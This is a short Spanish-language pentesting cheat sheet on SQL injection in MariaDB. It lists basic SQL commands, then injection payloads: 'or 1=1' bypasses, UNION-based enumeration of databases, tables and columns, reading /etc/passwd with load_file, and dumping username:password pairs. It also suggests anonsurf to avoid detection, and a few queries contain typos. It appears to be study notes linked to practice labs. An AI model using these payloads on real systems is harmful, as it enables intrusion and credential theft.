---
title: sqlInjection
published: true
---


* MariaDb sql:
<br>
<p>		* Use <font color="lime">anonsruf </font>para no ser detectado</p>
<p>	    * Mire los valores de simbolos en hexadecimal con <font color="lime">man ascii</font></p>
<p> 	* Mas informacion de sql en cuanto a codigo respecta <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"> aqui </a></p>
<p> 	* Mas laboratorios de pentesting : <a href="https://portswigger.net/web-security/all-labs">aqui</a></p>
<br>
```python

mysql -u{useraname} -p{password} # Conectar a la base de datos.

create database {DATABASE NAME}; # Crea una base de datos.

drop database {DATABASE NAME}; # ELimina una base de datos.

create table users(id int auto_increment PRIMARY KEY, username varchar(32), password varchar(32), vip varchar(32)); # Creacion de tabla.

drop table {TABLE NAME}; # Elimina una tabla.

show databases; # Muestra la base de datos actuales.

use [database_name]; # Usa la base de datos seleccionada.

show tables; # Muestra las tablas de la base de datos.

describe [table_name]; # Muestra la descripcion de una tabla.

select * from [table_name]; # Muestra todo el contenido de una tabla.

insert into users(username, password, vip) values("admin", "adminpass$!-?", "No aplica"); # Insertar valores en una tabla creada.

where = done.
select = seleccion.
from = de.

	* SQL INJECTION

'or 1 = 1- --

'or 1 = 1#

select * from users where username='admin'or 1=1;-- -; # Listar todos los datos de una tabla.

select * from users where username='admin'order by 5; # Enumerar la cantidad de columnas en una tabla, en este caso el tope era 4 es decir que dara un fallo.

select * from users where username='admin'union select version(),database(),user(),NULL; # Muestra la version,nombre BD, usuario, NULL 'nada'.

select * from users where username='admin'union select load_file('/etc/pass'),NULL,NULL; # Carga el archivo /etc/passwd para poder verlo.

@@version # alternativas a version().

select username from users where username='admin' union select scheme_name from information_schema.schemata; # Observa toda las bases de datos.

select * from users union select 1,2,3,group_contac(schema_name) from information_schema.schemata; # Muestra las bases de datos dentro de la misma cadena es decir, en caso dado que la pagina no le represente todas las bases de datos, esta es una alternativa.

select * from users union select 1,2,3,schema_name from information_schema.schemata limit 1,1; # Otra alternativa de group_contact() para mostrar los datos uno por uno.

select id, username from users union select NULL,table_name from information_schema.tables; #Lista todas las tablas de todas las bases de datos.

select id, username from users union select NULL,table_name from information_schema.tables where table_schema='{BASE DE DATOS}' # Enumera las tablas de una base de datos dada.

select * from users union select NULL,NULL,NULL,column_name from information_schema.columns where table_schema='{BASE DE DATOS}' and table_name='{TABLE NAME}' # Enumera las columnas de una tabla dada.

select username from users union select group_concat(password) from users; # Mira el contenido de una columna.

select username from users union select group_concat(username,':',password, ' -> '); # Para verlos mas ordenado.

select username from users union select group_concat(username,0x3A,password); # Alternativa por si no deja incrustar string, se le incrusta hexadecimal.

select * from users union select NULL,NULL,NULL,group_concat(username,0x3a,password) from practiqueSql.users; # Muestra el contenido de una tabla dada de una base de datos dada.

```






